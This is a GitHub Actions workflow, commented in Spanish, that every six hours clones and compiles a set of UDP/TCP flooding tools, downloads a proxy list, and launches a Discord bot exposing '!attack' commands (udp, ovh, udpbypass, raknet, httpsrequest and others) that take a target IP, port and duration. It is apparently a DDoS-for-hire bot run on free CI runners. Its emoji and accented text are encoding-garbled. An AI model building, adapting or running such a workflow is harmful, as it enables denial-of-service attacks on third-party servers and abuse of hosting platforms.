name: BOT9

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  clone-compile-run:
    runs-on: ubuntu-latest
    
    steps:
    - name: üóëÔ∏è Limpiar directorio anterior
      run: |
        echo "Limpiando directorios anteriores..."
        rm -rf BotUDPs 2>/dev/null || true
    
    - name: üì• Clonar repositorio
      run: |
        echo "Clonando repositorio BotUDPs..."
        if ! git clone https://github.com/zJonch14/BotUDPs.git; then
          echo "‚ùå Error clonando, intentando clonado superficial..."
          git clone --depth 1 https://github.com/zJonch14/BotUDPs.git || exit 1
        fi
        
        cd BotUDPs
        echo "‚úÖ Repositorio clonado"
        echo "üìÅ Contenido:"
        ls -la
    
    - name: üêç Configurar Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: üîß Instalar herramientas esenciales
      run: |
        echo "Instalando herramientas..."
        sudo apt-get update
        sudo apt-get install -y build-essential gcc g++ make libpcap-dev wget
        echo "‚úÖ Herramientas instaladas"
    
    - name: üì¶ Instalar discord.py
      run: |
        cd BotUDPs
        pip install discord.py
        echo "‚úÖ discord.py instalado"

    - name: Download and prepare proxy list
      run: |
        cd BotUDPs
        echo "=== Downloading Proxy List ==="
        wget -O proxy.txt "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=100&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
        echo "=== Proxy List Downloaded ==="

    - name: üõ†Ô∏è COMPILAR CON CONTINUACI√ìN ANTE ERRORES
      run: |
        cd BotUDPs
        echo "========================================"
        echo "COMPILACI√ìN CON TOLERANCIA A FALLOS"
        echo "========================================"
        
        # Desactivar exit-on-error para este paso
        set +e
        
        echo "üìã Archivos .c encontrados:"
        find . -maxdepth 1 -name "*.c" -type f
        
        compiled=0
        failed=0
        
        for c_file in *.c; do
          [ -f "$c_file" ] || continue
          
          binary="${c_file%.c}"
          echo ""
          echo "üî® Compilando: $c_file ‚Üí $binary"
          
          # Intentar compilar cada archivo
          if gcc -O3 -pthread "$c_file" -o "$binary" 2>&1; then
            chmod +x "$binary"
            echo "  ‚úÖ $binary compilado exitosamente"
            ((compiled++))
          else
            echo "  ‚ùå Error compilando $binary"
            # Mostrar error espec√≠fico
            gcc -O3 -pthread "$c_file" -o "$binary" 2>&1 | head -5
            ((failed++))
          fi
        done

        echo ""
        echo "üî® Compilando tcp sin threads: tcp.c ‚Üí tcp"
        gcc -O3 tcp.c -o tcp
        chmod +x tcp
        echo ""
        
        echo ""
        echo "========================================"
        echo "RESUMEN DE COMPILACI√ìN:"
        echo "  ‚úÖ $compiled compilados exitosamente"
        echo "  ‚ùå $failed con errores"
        echo ""
        echo "üìÇ EJECUTABLES DISPONIBLES:"
        find . -maxdepth 1 -type f -executable ! -name "*.py" ! -name "*.go" ! -name "*.sh" | while read exe; do
          size=$(stat -c%s "$exe" 2>/dev/null || echo "?")
          echo "  ‚úì $(basename "$exe") (${size} bytes)"
        done || echo "  Ning√∫n ejecutable encontrado"
        
        # Reactivar exit-on-error
        set -e
        
        echo "========================================"
        echo "‚ö†Ô∏è  Continuando aunque algunos archivos hayan fallado"

    
    - name: ü¶æ Configurar Go para scripts .go
      run: |
        cd BotUDPs
        
        # Solo si hay archivos .go
        if ls *.go >/dev/null 2>&1; then
          echo "ü¶æ Configurando Go..."
          
          # Instalar dependencias Go
          go get github.com/sandertv/go-raknet 2>/dev/null || echo "‚ö†Ô∏è  go-raknet opcional"
          
          echo "‚úÖ Go configurado"
        else
          echo "‚ö†Ô∏è  No hay archivos .go, omitiendo Go"
        fi
    
    - name: üîê Configurar token DESDE SECRET KEYS
      env:
        DISCORD_TOKEN: ${{ secrets.KEYS }}
      run: |
        cd BotUDPs
        
        if [ -z "$DISCORD_TOKEN" ]; then
          echo "‚ùå ERROR: Secret 'KEYS' no configurado"
          echo "Config√∫ralo en Settings ‚Üí Secrets ‚Üí Actions ‚Üí KEYS"
          exit 1
        fi
        
        echo "$DISCORD_TOKEN" > token.txt
        echo "‚úÖ Token guardado en token.txt"

    - name: Install Node.js
      run: |
          cd BotUDPs
          sudo apt-get update
          sudo apt-get install -y nodejs npm
          sudo npm install -g request

    - name: üöÄ EJECUTAR bot.py
      run: |
        cd BotUDPs
        echo "========================================"
        echo "üöÄ INICIANDO BOT UDP"
        echo "========================================"
        echo "üìÖ Hora: $(date)"
        echo ""
        
        # Verificar que tenemos lo m√≠nimo necesario
        if [ ! -f "bot.py" ]; then
          echo "‚ùå ERROR: bot.py no encontrado"
          exit 1
        fi
        
        if [ ! -f "token.txt" ]; then
          echo "‚ùå ERROR: token.txt no encontrado"
          exit 1
        fi

        if [ ! -f "gravitus.js" ]; then
          echo "‚ùå ERROR: gravitus.js no encontrado"
          exit 1
        fi

        if [ ! -f "proxy.txt" ]; then
          echo "‚ùå ERROR: proxy.txt no encontrado"
          exit 1
        fi
        
        echo "‚úÖ Archivos cr√≠ticos verificados"
        echo "üéÆ M√©todos disponibles seg√∫n ejecutables:"
        
        # Mostrar m√©todos basados en ejecutables disponibles
        for method in udp udphex udppps ovh tcp udppayload udpbypass; do
          if [ -f "$method" ]; then
            echo "  !attack $method [IP] [PUERTO] [TIEMPO]"
          fi
        done

        echo "  !attack httpsrequest [IP] [PUERTO] [TIEMPO]"
        
        if [ -f "udpflood.go" ]; then
          echo "  !attack udpflood [IP] [PUERTO] [TIEMPO]"
        fi
        
        if [ -f "raknet.go" ]; then
          echo "  !attack raknet [IP] [PUERTO] [TIEMPO]"
        fi
        
        echo ""
        echo "‚ö° INICIANDO BOT..."
        echo "El bot se ejecutar√° hasta el l√≠mite de GitHub (~6h)"
        echo ""
        
        # Ejecutar bot
        python3 bot.py
        
        echo ""
        echo "========================================"
        echo "BOT DETENIDO - Hora: $(date)"
        echo "========================================"
